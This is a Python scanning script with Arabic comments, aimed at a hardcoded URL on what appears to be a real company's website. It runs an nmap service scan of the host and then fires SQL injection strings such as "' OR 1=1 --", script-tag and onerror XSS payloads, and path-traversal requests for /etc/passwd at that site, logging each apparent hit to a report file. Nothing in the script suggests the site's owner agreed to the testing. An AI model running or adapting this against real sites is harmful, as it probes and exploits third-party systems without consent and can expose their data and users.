import requests
from bs4 import BeautifulSoup
import subprocess

# العنوان الهدف
target_url = "https://www.qisolutions.us/en/?option=com_grid&gid=4/1000&p=0"

# حمولات SQL Injection
sql_payloads = ["'", "' OR '1'='1", "' OR 1=1 --", "' OR 'a'='a"]

# حمولات XSS
xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"]

# حمولات File Inclusion
file_inclusion_payloads = ["../etc/passwd", "../../etc/passwd"]

def log_results(result):
    with open("vulnerability_report.txt", "a") as report:
        report.write(result + "\n")

def scan_ports(ip):
    print(f"[*] Scanning open ports on {ip}")
    result = subprocess.check_output(["nmap", "-sV", "-oN", "ports_scan.txt", ip])
    print(result.decode())
    log_results("Port scan results:\n" + result.decode())

def test_sql_injection(url):
    print(f"[*] Testing SQL Injection on {url}")
    for payload in sql_payloads:
        response = requests.get(url + payload)
        if "mysql" in response.text.lower() or "syntax" in response.text.lower():
            print(f"[+] SQL Injection vulnerability detected with payload: {payload}")
            log_results(f"SQL Injection vulnerability found in {url} with payload: {payload}")
        else:
            print(f"[-] No vulnerability detected with payload: {payload}")

def test_xss(url, param):
    print(f"[*] Testing XSS on {url}")
    for payload in xss_payloads:
        data = {param: payload}
        response = requests.get(url, params=data)
        if payload in response.text:
            print(f"[+] XSS vulnerability detected with payload: {payload}")
            log_results(f"XSS vulnerability found in {url} with payload: {payload}")
        else:
            print(f"[-] No XSS vulnerability detected with payload: {payload}")

def test_file_inclusion(url):
    print(f"[*] Testing File Inclusion on {url}")
    for payload in file_inclusion_payloads:
        response = requests.get(url + payload)
        if "root:x" in response.text or "bin/bash" in response.text:
            print(f"[+] File Inclusion vulnerability detected with payload: {payload}")
            log_results(f"File Inclusion vulnerability found in {url} with payload: {payload}")
        else:
            print(f"[-] No File Inclusion vulnerability detected with payload: {payload}")

# التشغيل الرئيسي للأداة
def main():
    print("[*] Starting vulnerability scan on target...")
    
    # خطوة 1: جمع معلومات حول الهدف
    target_ip = target_url.split("/")[2]
    scan_ports(target_ip)
    
    # خطوة 2: فحص SQL Injection
    test_sql_injection(target_url)

    # خطوة 3: فحص XSS
    test_xss(target_url, "id")  # تعديل 'id' بحسب مدخل الصفحة

    # خطوة 4: فحص File Inclusion
    test_file_inclusion(target_url)
    
    print("[*] Scan complete. Results saved in vulnerability_report.txt")

# تنفيذ الأداة
if __name__ == "__main__":
    main()
